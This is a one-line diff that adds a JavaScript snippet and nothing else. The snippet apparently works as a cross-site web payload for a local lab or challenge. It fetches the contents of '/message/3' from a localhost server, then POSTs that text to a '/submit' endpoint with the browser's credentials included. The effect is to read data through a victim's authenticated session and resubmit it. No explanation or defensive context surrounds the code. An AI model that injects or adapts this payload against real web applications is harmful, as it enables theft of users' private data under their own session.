@@ -1,0 +1,1 @@
+fetch('http://127.0.0.1/message/3').then(r => r.text()).then(t => fetch('http://127.0.0.1/submit', {method: 'POST', mode: 'cors', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({message: t})}))
